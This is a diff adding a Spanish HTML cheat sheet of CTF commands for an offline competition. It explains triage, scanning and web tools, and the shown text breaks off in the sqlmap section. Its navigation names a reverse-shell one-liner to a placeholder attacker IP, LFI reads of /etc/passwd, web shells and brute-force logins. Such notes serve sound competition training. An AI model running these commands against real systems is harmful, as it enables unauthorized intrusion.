@@ -1,0 +1,1284 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Apuntes CTF</title>
+<style>
+:root{
+  --bg:#0f1115; --panel:#171a21; --panel2:#1d212b; --text:#e6e8ee; --muted:#9aa3b2;
+  --accent:#5bd1a0; --accent2:#6aa8ff; --border:#2a2f3a; --code:#0b0d12; --code-text:#d7e3ff;
+  --mark:#ffd86b;
+}
+@media (prefers-color-scheme: light){
+  :root:not([data-theme="dark"]){
+    --bg:#f6f7f9; --panel:#ffffff; --panel2:#eef1f5; --text:#1b1e24; --muted:#5a6475;
+    --accent:#128a5c; --accent2:#2563eb; --border:#dde1e8; --code:#11151c; --code-text:#d7e3ff;
+    --mark:#ffe08a;
+  }
+}
+:root[data-theme="dark"]{
+  --bg:#0f1115; --panel:#171a21; --panel2:#1d212b; --text:#e6e8ee; --muted:#9aa3b2;
+  --accent:#5bd1a0; --accent2:#6aa8ff; --border:#2a2f3a; --code:#0b0d12; --code-text:#d7e3ff;
+  --mark:#ffd86b;
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  margin:0; background:var(--bg); color:var(--text);
+  font:16px/1.65 system-ui,-apple-system,"Segoe UI",Roboto,Ubuntu,sans-serif;
+  -webkit-text-size-adjust:100%;
+}
+a{color:var(--accent2); text-decoration:none}
+a:hover{text-decoration:underline}
+
+/* Layout */
+.wrap{display:flex; min-height:100vh}
+.sidebar{
+  width:300px; flex:0 0 300px; background:var(--panel); border-right:1px solid var(--border);
+  position:sticky; top:0; height:100vh; overflow-y:auto; padding:0 0 40px;
+}
+.main{flex:1 1 auto; min-width:0; padding:0 0 120px}
+.inner{max-width:900px; margin:0 auto; padding:0 24px}
+
+/* Topbar */
+.topbar{
+  position:sticky; top:0; z-index:20; background:var(--bg);
+  border-bottom:1px solid var(--border); padding:12px 24px;
+  display:flex; align-items:center; gap:12px;
+}
+.topbar h1{font-size:17px; margin:0; font-weight:650}
+.topbar .sp{flex:1}
+.btn{
+  background:var(--panel2); color:var(--text); border:1px solid var(--border);
+  border-radius:8px; padding:7px 11px; cursor:pointer; font-size:13px;
+}
+.btn:hover{border-color:var(--accent)}
+.menu-toggle{display:none}
+
+/* Sidebar brand + search */
+.brand{padding:16px 18px 10px; display:flex; align-items:center; gap:10px; border-bottom:1px solid var(--border)}
+.brand .logo{font-size:22px}
+.brand .t{font-weight:700}
+.brand .s{font-size:12px; color:var(--muted)}
+.searchbox{padding:12px 14px; border-bottom:1px solid var(--border)}
+.searchbox input{
+  width:100%; padding:9px 11px; border-radius:8px; border:1px solid var(--border);
+  background:var(--bg); color:var(--text); font-size:14px;
+}
+.searchbox input::placeholder{color:var(--muted)}
+
+/* Nav */
+.navgroup{border-bottom:1px solid var(--border)}
+.navhead{
+  width:100%; text-align:left; background:none; border:0; color:var(--text);
+  padding:11px 14px; display:flex; align-items:center; gap:9px; cursor:pointer;
+  font-size:14px; font-weight:650;
+}
+.navhead:hover{background:var(--panel2)}
+.navhead .ico{font-size:16px}
+.navhead .chev{margin-left:auto; color:var(--muted); transition:transform .15s}
+.navhead[aria-expanded="false"] .chev{transform:rotate(-90deg)}
+.navlinks{display:flex; flex-direction:column; padding:2px 0 8px}
+.navgroup[aria-collapsed="true"] .navlinks{display:none}
+.navlinks a{
+  color:var(--muted); padding:5px 14px 5px 36px; font-size:13.5px; border-left:2px solid transparent;
+}
+.navlinks a.lvl3{padding-left:52px; font-size:12.5px; opacity:.9}
+.navlinks a:hover{color:var(--text); text-decoration:none; background:var(--panel2)}
+.navlinks a.active{color:var(--accent); border-left-color:var(--accent); background:var(--panel2)}
+.navlinks a.hide{display:none}
+
+/* Content */
+.doc{padding-top:8px}
+.doc h1{font-size:28px; margin:34px 0 8px; padding-bottom:8px; border-bottom:2px solid var(--border)}
+.doc h2{font-size:22px; margin:40px 0 10px; scroll-margin-top:70px}
+.doc h3{font-size:18px; margin:26px 0 8px; scroll-margin-top:70px; color:var(--accent)}
+.doc h4{font-size:15.5px; margin:20px 0 6px; color:var(--muted); text-transform:uppercase; letter-spacing:.03em}
+.doc h1,.doc h2,.doc h3{scroll-margin-top:70px}
+.anchor{opacity:0; margin-left:8px; color:var(--muted); font-weight:400; text-decoration:none}
+h1:hover .anchor,h2:hover .anchor,h3:hover .anchor{opacity:.6}
+.doc p{margin:10px 0}
+.doc ul{margin:8px 0; padding-left:22px}
+.doc li{margin:4px 0}
+.doc li.task{list-style:none; margin-left:-22px; display:flex; gap:8px; align-items:flex-start}
+.doc li.task input{margin-top:5px}
+blockquote{
+  margin:12px 0; padding:10px 14px; border-left:3px solid var(--accent);
+  background:var(--panel); border-radius:0 8px 8px 0; color:var(--muted);
+}
+hr{border:0; border-top:1px solid var(--border); margin:28px 0}
+
+/* code */
+code{
+  background:var(--panel2); padding:2px 6px; border-radius:5px; font-size:.9em;
+  font-family:"JetBrains Mono",ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+}
+.code{position:relative; margin:14px 0}
+.code pre{
+  background:var(--code); color:var(--code-text); padding:14px 16px; border-radius:10px;
+  overflow:auto; border:1px solid var(--border); margin:0;
+}
+.code pre code{background:none; padding:0; color:inherit; font-size:13.5px; line-height:1.6}
+.code pre[data-lang]::before{
+  content:attr(data-lang); position:absolute; top:0; left:14px; transform:translateY(-50%);
+  font-size:11px; color:var(--muted); background:var(--bg); padding:0 6px; border-radius:4px;
+}
+.copy{
+  position:absolute; top:8px; right:8px; z-index:2; font-size:11px; padding:4px 8px;
+  background:var(--panel2); color:var(--muted); border:1px solid var(--border);
+  border-radius:6px; cursor:pointer; opacity:0; transition:opacity .12s;
+}
+.code:hover .copy{opacity:1}
+.copy:hover{color:var(--text); border-color:var(--accent)}
+.copy.done{color:var(--accent); border-color:var(--accent)}
+
+/* tables */
+.tablewrap{overflow-x:auto; margin:14px 0}
+table{border-collapse:collapse; width:100%; font-size:14px}
+th,td{border:1px solid var(--border); padding:8px 10px; text-align:left; vertical-align:top}
+th{background:var(--panel2)}
+
+mark{background:var(--mark); color:#111; padding:0 2px; border-radius:3px}
+
+.empty{display:none; color:var(--muted); padding:30px 24px; text-align:center}
+
+/* scroll-to-top */
+.totop{
+  position:fixed; right:18px; bottom:18px; z-index:30; width:42px; height:42px; border-radius:50%;
+  background:var(--accent); color:#06231a; border:0; font-size:20px; cursor:pointer;
+  box-shadow:0 4px 14px rgba(0,0,0,.3); display:none;
+}
+.totop.show{display:block}
+
+/* responsive */
+@media (max-width:860px){
+  .menu-toggle{display:inline-flex}
+  .sidebar{
+    position:fixed; left:0; top:0; z-index:40; height:100vh; transform:translateX(-100%);
+    transition:transform .2s; box-shadow:4px 0 20px rgba(0,0,0,.35);
+  }
+  body.nav-open .sidebar{transform:translateX(0)}
+  .backdrop{
+    display:none; position:fixed; inset:0; background:rgba(0,0,0,.5); z-index:35;
+  }
+  body.nav-open .backdrop{display:block}
+  .inner{padding:0 16px}
+  .topbar{padding:12px 16px}
+}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <aside class="sidebar" id="sidebar">
+    <div class="brand">
+      <span class="logo">🚩</span>
+      <div>
+        <div class="t">Apuntes CTF</div>
+        <div class="s">CyberFEI 3.0 · kit offline</div>
+      </div>
+    </div>
+    <div class="searchbox">
+      <input id="search" type="search" placeholder="Buscar en el menú…" autocomplete="off">
+    </div>
+    <nav id="nav">
+      <div class="navgroup" data-sec="comandos"><button class="navhead" aria-expanded="true"><span class="ico">⌨️</span><span>Comandos</span><span class="chev">▾</span></button><div class="navlinks"><a class="lvl2" href="#reglas-del-evento-cyberfei-30-21-oct-salón-cristal-35-h" data-slug="reglas-del-evento-cyberfei-30-21-oct-salón-cristal-35-h">⚠️ Reglas del evento (CYBERFEI 3.0 · 21 oct · Salón Cristal · 3.5 h)</a><a class="lvl2" href="#0-lo-que-haces-con-cualquier-archivo-que-te-den" data-slug="0-lo-que-haces-con-cualquier-archivo-que-te-den">0. Lo que haces con CUALQUIER archivo que te den</a><a class="lvl2" href="#1-cómo-se-estructura-un-comando-para-que-lo-entiendas-no-lo-memorices" data-slug="1-cómo-se-estructura-un-comando-para-que-lo-entiendas-no-lo-memorices">1. Cómo se estructura un comando (para que lo entiendas, no lo memorices)</a><a class="lvl2" href="#2-reconocimiento-de-red-servicios" data-slug="2-reconocimiento-de-red-servicios">2. Reconocimiento de red / servicios</a><a class="lvl2" href="#3-web" data-slug="3-web">3. Web</a><a class="lvl2" href="#4-contraseñas-y-hashes" data-slug="4-contraseñas-y-hashes">4. Contraseñas y hashes</a><a class="lvl2" href="#5-esteganografía-datos-escondidos-en-imágenesaudio" data-slug="5-esteganografía-datos-escondidos-en-imágenesaudio">5. Esteganografía (datos escondidos en imágenes/audio)</a><a class="lvl2" href="#6-capturas-de-red-pcap" data-slug="6-capturas-de-red-pcap">6. Capturas de red (.pcap)</a><a class="lvl2" href="#7-reversing-entender-un-binario" data-slug="7-reversing-entender-un-binario">7. Reversing (entender un binario)</a><a class="lvl2" href="#8-decodificar-texto-raro-base64-hex-rot" data-slug="8-decodificar-texto-raro-base64-hex-rot">8. Decodificar texto raro (base64, hex, rot...)</a><a class="lvl2" href="#9-buscar-la-flag-en-todo-un-directorio" data-slug="9-buscar-la-flag-en-todo-un-directorio">9. Buscar la flag en todo un directorio</a><a class="lvl2" href="#reglas-del-día" data-slug="reglas-del-día">Reglas del día</a><a class="lvl2" href="#10-triage-el-reflejo-universal-corre-esto-siempre-primero" data-slug="10-triage-el-reflejo-universal-corre-esto-siempre-primero">10. Triage — el reflejo universal (corre esto SIEMPRE primero)</a><a class="lvl2" href="#11-guardar-evidencia-clave-para-el-writeup-40-pts" data-slug="11-guardar-evidencia-clave-para-el-writeup-40-pts">11. Guardar evidencia (clave para el writeup = 40 pts)</a><a class="lvl2" href="#12-tráfico-tcpdump-y-tshark-además-de-wireshark" data-slug="12-tráfico-tcpdump-y-tshark-además-de-wireshark">12. Tráfico — tcpdump y tshark (además de Wireshark)</a><a class="lvl2" href="#13-reversing-gdb-y-radare2-entrar-al-binario" data-slug="13-reversing-gdb-y-radare2-entrar-al-binario">13. Reversing — gdb y radare2 (entrar al binario)</a><a class="lvl2" href="#14-forense-de-memoria-volatility-3" data-slug="14-forense-de-memoria-volatility-3">14. Forense de memoria — Volatility 3</a><a class="lvl2" href="#15-forense-de-disco-sleuth-kit-y-carving" data-slug="15-forense-de-disco-sleuth-kit-y-carving">15. Forense de disco — Sleuth Kit y carving</a><a class="lvl2" href="#16-blue-team-análisis-de-logs-grep-razonar" data-slug="16-blue-team-análisis-de-logs-grep-razonar">16. Blue Team — análisis de logs (grep + razonar)</a><a class="lvl2" href="#17-web-lo-que-faltaba-inyección-manual-100-estilo" data-slug="17-web-lo-que-faltaba-inyección-manual-100-estilo">17. Web — lo que faltaba (inyección MANUAL = 100% estilo)</a><a class="lvl3" href="#command-injection-cuando-un-campo-ejecuta-comandos-del-sistema" data-slug="command-injection-cuando-un-campo-ejecuta-comandos-del-sistema">Command injection (cuando un campo ejecuta comandos del sistema)</a><a class="lvl3" href="#ssti-inyección-de-plantillas" data-slug="ssti-inyección-de-plantillas">SSTI — inyección de plantillas</a><a class="lvl3" href="#sql-injection-manual-detectar" data-slug="sql-injection-manual-detectar">SQL injection manual (detectar)</a><a class="lvl3" href="#lfi-leer-el-fuente-php" data-slug="lfi-leer-el-fuente-php">LFI / leer el fuente PHP</a><a class="lvl3" href="#jwt-tokens-eyj" data-slug="jwt-tokens-eyj">JWT (tokens eyJ...)</a><a class="lvl3" href="#cookies" data-slug="cookies">Cookies</a><a class="lvl3" href="#gtfobins" data-slug="gtfobins">GTFOBins</a><a class="lvl2" href="#18-criptoestego-lo-que-faltaba" data-slug="18-criptoestego-lo-que-faltaba">18. Cripto/estego — lo que faltaba</a><a class="lvl3" href="#hashcat-por-modo" data-slug="hashcat-por-modo">hashcat por modo</a><a class="lvl3" href="#john-por-formato" data-slug="john-por-formato">john por formato</a><a class="lvl3" href="#archivos-protegidos-a-formato-de-john" data-slug="archivos-protegidos-a-formato-de-john">Archivos protegidos → a formato de john</a><a class="lvl3" href="#estego-en-texto-contenedores" data-slug="estego-en-texto-contenedores">Estego en texto / contenedores</a><a class="lvl3" href="#estego-en-imagenqraudio" data-slug="estego-en-imagenqraudio">Estego en imagen/QR/audio</a><a class="lvl2" href="#wpscan-enumerar-wordpress-zona-gris-pregunta-antes" data-slug="wpscan-enumerar-wordpress-zona-gris-pregunta-antes">wpscan — enumerar WordPress  ⚠️ ZONA GRIS (pregunta antes)</a><a class="lvl2" href="#searchsploit-buscar-exploits-sin-internet-es-local" data-slug="searchsploit-buscar-exploits-sin-internet-es-local">searchsploit — buscar exploits SIN internet  ✅ (es local)</a><a class="lvl2" href="#inyección-resumen-prioriza-siempre-lo-manual" data-slug="inyección-resumen-prioriza-siempre-lo-manual">Inyección — resumen (prioriza SIEMPRE lo manual)</a><a class="lvl2" href="#19-feroxbuster-ferro-descubrir-rutas-pero-recursivo" data-slug="19-feroxbuster-ferro-descubrir-rutas-pero-recursivo">19. feroxbuster ("ferro") — descubrir rutas, pero RECURSIVO</a><a class="lvl2" href="#20-inyección-de-shell-de-ejecuto-comandos-a-tengo-una-consola" data-slug="20-inyección-de-shell-de-ejecuto-comandos-a-tengo-una-consola">20. Inyección de shell — de "ejecuto comandos" a "tengo una consola"</a><a class="lvl3" href="#paso-1-en-tu-máquina-kali-ponte-a-escuchar" data-slug="paso-1-en-tu-máquina-kali-ponte-a-escuchar">Paso 1 — en TU máquina (Kali), ponte a escuchar</a><a class="lvl3" href="#paso-2-en-la-víctima-vía-la-inyección-lanza-la-reverse-shell" data-slug="paso-2-en-la-víctima-vía-la-inyección-lanza-la-reverse-shell">Paso 2 — en la víctima (vía la inyección), lanza la reverse shell</a><a class="lvl3" href="#paso-3-estabilizar-la-shell-que-funcionen-flechas-ctrl-c-nano" data-slug="paso-3-estabilizar-la-shell-que-funcionen-flechas-ctrl-c-nano">Paso 3 — estabilizar la shell (que funcionen flechas, Ctrl-C, nano)</a><a class="lvl3" href="#web-shell-cuando-puedes-subir-un-archivo" data-slug="web-shell-cuando-puedes-subir-un-archivo">Web shell (cuando puedes SUBIR un archivo)</a><a class="lvl3" href="#qué-hacer-ya-con-una-shell-dentro" data-slug="qué-hacer-ya-con-una-shell-dentro">Qué hacer ya con una shell dentro</a><a class="lvl3" href="#usar-un-web-shell-que-ya-subiste-post-explotación" data-slug="usar-un-web-shell-que-ya-subiste-post-explotación">Usar un web shell que ya subiste (post-explotación)</a><a class="lvl2" href="#21-hydra-fuerza-bruta-de-login-en-línea" data-slug="21-hydra-fuerza-bruta-de-login-en-línea">21. hydra — fuerza bruta de login (en línea)</a><a class="lvl2" href="#22-msfconsole-metasploit-framework-de-explotación" data-slug="22-msfconsole-metasploit-framework-de-explotación">22. msfconsole — Metasploit (framework de explotación)</a></div></div>
+<div class="navgroup" data-sec="guia"><button class="navhead" aria-expanded="true"><span class="ico">📖</span><span>Guía explicada</span><span class="chev">▾</span></button><div class="navlinks"><a class="lvl3" href="#file-archivo" data-slug="file-archivo">file ARCHIVO</a><a class="lvl3" href="#strings--n-6-archivo" data-slug="strings--n-6-archivo">strings -n 6 ARCHIVO</a><a class="lvl3" href="#exiftool-archivo" data-slug="exiftool-archivo">exiftool ARCHIVO</a><a class="lvl3" href="#binwalk-archivo-binwalk--e-archivo" data-slug="binwalk-archivo-binwalk--e-archivo">binwalk ARCHIVO / binwalk -e ARCHIVO</a><a class="lvl3" href="#xxd-archivo-head" data-slug="xxd-archivo-head">xxd ARCHIVO | head</a><a class="lvl3" href="#nmap--sc--sv--p--objetivo" data-slug="nmap--sc--sv--p--objetivo">nmap -sC -sV -p- OBJETIVO</a><a class="lvl3" href="#nc-objetivo-puerto" data-slug="nc-objetivo-puerto">nc OBJETIVO PUERTO</a><a class="lvl3" href="#curl--i-httpobjetivo" data-slug="curl--i-httpobjetivo">curl -I http://OBJETIVO</a><a class="lvl3" href="#curl-con-opciones-post-cookie-proxy" data-slug="curl-con-opciones-post-cookie-proxy">curl con opciones (POST, cookie, proxy)</a><a class="lvl3" href="#feroxbuster--u-httpobjetivo-ferro" data-slug="feroxbuster--u-httpobjetivo-ferro">feroxbuster -u http://OBJETIVO ("ferro")</a><a class="lvl3" href="#inyección-sql-detectar-a-mano" data-slug="inyección-sql-detectar-a-mano">Inyección SQL — detectar a mano</a><a class="lvl3" href="#ssti-77" data-slug="ssti-77">SSTI — {{77}}</a><a class="lvl3" href="#lfi-fileetcpasswd" data-slug="lfi-fileetcpasswd">LFI — ?file=../../../../etc/passwd</a><a class="lvl3" href="#hashid-hash" data-slug="hashid-hash">hashid 'HASH'</a><a class="lvl3" href="#hashcat--m-modo-hashtxt-rockyoutxt" data-slug="hashcat--m-modo-hashtxt-rockyoutxt">hashcat -m MODO hash.txt rockyou.txt</a><a class="lvl3" href="#john---wordlistrockyoutxt-htxt-y-zip2john" data-slug="john---wordlistrockyoutxt-htxt-y-zip2john">john --wordlist=rockyou.txt h.txt y zip2john</a><a class="lvl3" href="#zsteg--a-imgpng" data-slug="zsteg--a-imgpng">zsteg -a img.png</a><a class="lvl3" href="#steghide-extract--sf-imgjpg-stegseek-imgjpg-rockyoutxt" data-slug="steghide-extract--sf-imgjpg-stegseek-imgjpg-rockyoutxt">steghide extract -sf img.jpg / stegseek img.jpg rockyou.txt</a><a class="lvl3" href="#audio-espectrograma" data-slug="audio-espectrograma">Audio → espectrograma</a><a class="lvl3" href="#wireshark-follow-tcp-stream" data-slug="wireshark-follow-tcp-stream">Wireshark: Follow TCP Stream</a><a class="lvl3" href="#tshark--r-cappcap--y-httprequest" data-slug="tshark--r-cappcap--y-httprequest">tshark -r cap.pcap -Y "http.request"</a><a class="lvl3" href="#tcpdump--r-cappcap--a-grep--i-flag" data-slug="tcpdump--r-cappcap--a-grep--i-flag">tcpdump -r cap.pcap -A | grep -i flag</a><a class="lvl3" href="#checksec---filebinario" data-slug="checksec---filebinario">checksec --file=BINARIO</a><a class="lvl3" href="#ltrace-binario" data-slug="ltrace-binario">ltrace ./BINARIO</a><a class="lvl3" href="#strings--n-6-binario-grep--ie-flagpasskey" data-slug="strings--n-6-binario-grep--ie-flagpasskey">strings -n 6 BINARIO | grep -iE 'flag|pass|key'</a><a class="lvl3" href="#vol--f-dumpmem-windowsinfo" data-slug="vol--f-dumpmem-windowsinfo">vol -f dump.mem windows.info</a><a class="lvl3" href="#vol--f-dumpmem-windowspslist-windowscmdline" data-slug="vol--f-dumpmem-windowspslist-windowscmdline">vol -f dump.mem windows.pslist / windows.cmdline</a><a class="lvl3" href="#foremost--i-discoimg--o-salida" data-slug="foremost--i-discoimg--o-salida">foremost -i disco.img -o salida/</a><a class="lvl3" href="#nc--lvnp-4444-listener-en-tu-kali" data-slug="nc--lvnp-4444-listener-en-tu-kali">nc -lvnp 4444 (listener en tu Kali)</a><a class="lvl3" href="#bash--i-devtcptuip4444-01-en-la-víctima" data-slug="bash--i-devtcptuip4444-01-en-la-víctima">bash -i &gt;&amp; /dev/tcp/TUIP/4444 0&gt;&amp;1 (en la víctima)</a><a class="lvl3" href="#ya-con-shell-id-find--name-flag-2devnull-sudo--l" data-slug="ya-con-shell-id-find--name-flag-2devnull-sudo--l">Ya con shell: id, find / -name 'flag' 2&gt;/dev/null, sudo -l</a><a class="lvl3" href="#grep--raoie-a-za-z0-9" data-slug="grep--raoie-a-za-z0-9">grep -raoiE '[A-Za-z0-9]+\{[^}]+\}' .</a><a class="lvl2" href="#cómo-leer-cualquier-resultado-regla-mental" data-slug="cómo-leer-cualquier-resultado-regla-mental">Cómo leer CUALQUIER resultado (regla mental)</a></div></div>
+<div class="navgroup" data-sec="preparacion"><button class="navhead" aria-expanded="true"><span class="ico">📦</span><span>Preparación offline</span><span class="chev">▾</span></button><div class="navlinks"><a class="lvl2" href="#1-actualiza-e-instala-herramientas" data-slug="1-actualiza-e-instala-herramientas">1. Actualiza e instala herramientas</a><a class="lvl2" href="#2-diccionarios" data-slug="2-diccionarios">2. Diccionarios</a><a class="lvl2" href="#3-repos-que-conviene-clonar-funcionan-offline" data-slug="3-repos-que-conviene-clonar-funcionan-offline">3. Repos que conviene clonar (funcionan offline)</a><a class="lvl2" href="#3b-descargas-que-piden-red-hoy-evento-offline-mañana" data-slug="3b-descargas-que-piden-red-hoy-evento-offline-mañana">3b. Descargas que piden red HOY (evento offline mañana)</a><a class="lvl2" href="#4-verifica-que-todo-corre-sin-red" data-slug="4-verifica-que-todo-corre-sin-red">4. Verifica que todo corre SIN red</a><a class="lvl2" href="#5-copia-este-kit-a-la-vm-de-kali" data-slug="5-copia-este-kit-a-la-vm-de-kali">5. Copia este kit a la VM de Kali</a><a class="lvl2" href="#6-snapshot" data-slug="6-snapshot">6. Snapshot</a><a class="lvl2" href="#checklist-del-día" data-slug="checklist-del-día">Checklist del día</a></div></div>
+    </nav>
+  </aside>
+
+  <div class="backdrop" id="backdrop"></div>
+
+  <main class="main">
+    <div class="topbar">
+      <button class="btn menu-toggle" id="menuToggle" aria-label="Menú">☰</button>
+      <h1>🚩 Apuntes CTF</h1>
+      <span class="sp"></span>
+      <button class="btn" id="themeBtn" title="Tema claro/oscuro">🌓</button>
+    </div>
+    <div class="inner">
+      <section class="doc" id="sec-comandos" data-sec="comandos">
+<h1 id="comandos-para-ctf-kali-explicados">Comandos para CTF (Kali) — explicados<a class="anchor" href="#comandos-para-ctf-kali-explicados">#</a></h1>
+<p>Cada bloque trae: <strong>el comando</strong>, qué significa cada parte y para qué sirve. Convención: lo que va en MAYÚSCULAS lo cambias tú (OBJETIVO, PUERTO, ARCHIVO).</p>
+<hr>
+<h2 id="reglas-del-evento-cyberfei-30-21-oct-salón-cristal-35-h">⚠️ Reglas del evento (CYBERFEI 3.0 · 21 oct · Salón Cristal · 3.5 h)<a class="anchor" href="#reglas-del-evento-cyberfei-30-21-oct-salón-cristal-35-h">#</a></h2>
+<p>Estas reglas mandan sobre todo lo demás: 1. <strong>Sin internet.</strong> Descarga HOY herramientas, wordlists y docs. Mañana no se instala nada. 2. <strong>El writeup vale más que la bandera:</strong> Bandera <strong>30</strong> · Writeup <strong>40</strong> · Estilo <strong>40</strong>. 3. <strong>Origen del código:</strong> script <strong>propio = 100%</strong> de estilo · snippet de terceros = 50% · <strong>sospecha de IA = descalificación.</strong> 4. <strong>Formato de bandera:</strong> <code>flag{...}</code> o <code>CyberFEI{...}</code>. Búscala siempre con <code>grep</code>/<code>strings</code>. 5. <strong>Zona gris (pregunta a los organizadores antes de usar):</strong> <code>sqlmap</code>, <code>wpscan</code>, <code>nikto</code>/<code>nuclei</code>, RsaCtfTool y cualquier ataque automatizado. Si dudas, <strong>hazlo manual y documéntalo</strong> → eso te da el 100% de estilo.</p>
+<blockquote>Por la regla 3: escribe TÚ los comandos. Los <code>.py</code> del kit (<code>decode.py</code>, <code>rsa_tool.py</code>, <code>pwn_template.py</code>) son solo para <strong>estudiar en casa</strong>, NO para el evento.</blockquote>
+<hr>
+<h2 id="0-lo-que-haces-con-cualquier-archivo-que-te-den">0. Lo que haces con CUALQUIER archivo que te den<a class="anchor" href="#0-lo-que-haces-con-cualquier-archivo-que-te-den">#</a></h2>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>file ARCHIVO</code></pre></div>
+<ul>
+<li><code>file</code> mira los primeros bytes (magic bytes) y te dice <strong>qué es de verdad</strong>, sin fiarse de la extensión. Un ".jpg" puede ser un ZIP.</li>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>strings -n 6 ARCHIVO | less</code></pre></div>
+<ul>
+<li><code>strings</code> saca las secuencias de texto legible dentro de un binario.</li>
+<li><code>-n 6</code> = solo cadenas de 6 caracteres o más (quita ruido).</li>
+<li><code>| less</code> = lo paginas para leerlo. Sirve para <strong>ver la flag en claro, rutas, contraseñas</strong>.</li>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>strings -n 6 ARCHIVO | grep -iE 'flag|ctf|\{.*\}'</code></pre></div>
+<ul>
+<li><code>| grep</code> filtra la salida anterior.</li>
+<li><code>-i</code> = ignora mayúsculas/minúsculas. <code>-E</code> = regex extendida.</li>
+<li><code>'flag|ctf|\{.*\}'</code> = líneas con "flag", "ctf" o algo entre llaves. <strong>Encuentra la bandera directo.</strong></li>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>xxd ARCHIVO | head</code></pre></div>
+<ul>
+<li><code>xxd</code> = volcado hexadecimal + ASCII al lado. <code>| head</code> = primeras líneas.</li>
+<li>Sirve para ver los <strong>magic bytes</strong> y arreglar archivos corruptos.</li>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>exiftool ARCHIVO</code></pre></div>
+<ul>
+<li>Lee <strong>metadatos</strong>: autor, fecha, GPS, comentarios. En imágenes muchas veces la flag va en un campo "Comment".</li>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>binwalk ARCHIVO</code></pre></div>
+<ul>
+<li>Busca <strong>archivos escondidos dentro de otro</strong> (un ZIP metido en un PNG, etc.).</li>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>binwalk -e ARCHIVO</code></pre></div>
+<ul>
+<li><code>-e</code> = extrae lo que encontró. Los saca a una carpeta <code>_ARCHIVO.extracted</code>.</li>
+</ul>
+<hr>
+<h2 id="1-cómo-se-estructura-un-comando-para-que-lo-entiendas-no-lo-memorices">1. Cómo se estructura un comando (para que lo entiendas, no lo memorices)<a class="anchor" href="#1-cómo-se-estructura-un-comando-para-que-lo-entiendas-no-lo-memorices">#</a></h2>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre><code>programa   -opciones   argumento
+nmap       -sV -p-     10.10.10.5
+└ qué uso  └ cómo      └ sobre qué</code></pre></div>
+<ul>
+<li>Las <strong>opciones cortas</strong> van con un guion: <code>-p</code>. Las <strong>largas</strong> con dos: <code>--script</code>.</li>
+<li>Puedes <strong>encadenar</strong> salidas con <code>|</code> (tubería): la salida de la izquierda entra a la derecha.</li>
+<li>Puedes <strong>guardar</strong> la salida con <code>&gt;</code>: <code>nmap ... &gt; resultado.txt</code>.</li>
+<li><code>comando --help</code> o <code>man comando</code> te dan todas las opciones.</li>
+</ul>
+<hr>
+<h2 id="2-reconocimiento-de-red-servicios">2. Reconocimiento de red / servicios<a class="anchor" href="#2-reconocimiento-de-red-servicios">#</a></h2>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>nmap -sC -sV -p- OBJETIVO</code></pre></div>
+<ul>
+<li><code>nmap</code> = escáner de puertos.</li>
+<li><code>-p-</code> = escanea los 65535 puertos (no solo los comunes).</li>
+<li><code>-sV</code> = detecta la <strong>versión</strong> del servicio de cada puerto.</li>
+<li><code>-sC</code> = corre los scripts básicos de reconocimiento.</li>
+<li>Para qué: saber <strong>qué está corriendo</strong> y por dónde atacar.</li>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>nc OBJETIVO PUERTO</code></pre></div>
+<ul>
+<li><code>nc</code> (netcat) = te conectas "a pelo" a un puerto. Muchos retos de misc/pwn te dan <code>host puerto</code> y hablas con el servicio aquí.</li>
+</ul>
+<hr>
+<h2 id="3-web">3. Web<a class="anchor" href="#3-web">#</a></h2>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>curl -s http://OBJETIVO</code></pre></div>
+<ul>
+<li><code>curl</code> = pide una URL desde la terminal. <code>-s</code> = silencioso (sin barra de progreso).</li>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>curl -sI http://OBJETIVO</code></pre></div>
+<ul>
+<li><code>-I</code> = solo las <strong>cabeceras</strong> (headers). Ves servidor, cookies, redirecciones.</li>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>curl -s http://OBJETIVO/robots.txt</code></pre></div>
+<ul>
+<li>Archivos que suelen revelar rutas ocultas: <code>robots.txt</code>, <code>sitemap.xml</code>, <code>/.git/</code>.</li>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>gobuster dir -u http://OBJETIVO -w /usr/share/wordlists/dirb/common.txt</code></pre></div>
+<ul>
+<li><code>gobuster dir</code> = busca <strong>rutas/carpetas ocultas</strong> probando palabras de una lista.</li>
+<li><code>-u</code> = la URL. <code>-w</code> = el diccionario (wordlist) de nombres a probar.</li>
+<li>Para qué: encontrar <code>/admin</code>, <code>/backup</code>, <code>/flag.txt</code>, etc.</li>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>ffuf -u http://OBJETIVO/FUZZ -w LISTA.txt</code></pre></div>
+<ul>
+<li><code>ffuf</code> = fuzzer rápido. Donde pongas <code>FUZZ</code>, va probando cada palabra de la lista.</li>
+<li>Sirve igual que gobuster y también para parámetros o subdominios (mueves el <code>FUZZ</code>).</li>
+</ul>
+<div class="code"><button class="copy" title="Copiar">copiar</button><pre data-lang="bash"><code>sqlmap -u "http://OBJETIVO/item?id=1" --batch --dbs</code></pre></div>
+<ul>
+<li><code>sqlmap</code> = automatiza <strong>inyección SQL</strong> (solo contra el reto autorizado).</li>
+<li><code>-u</code> = la URL con el parámetro. <code>--batch</code> = responde solo a las preguntas.</li>
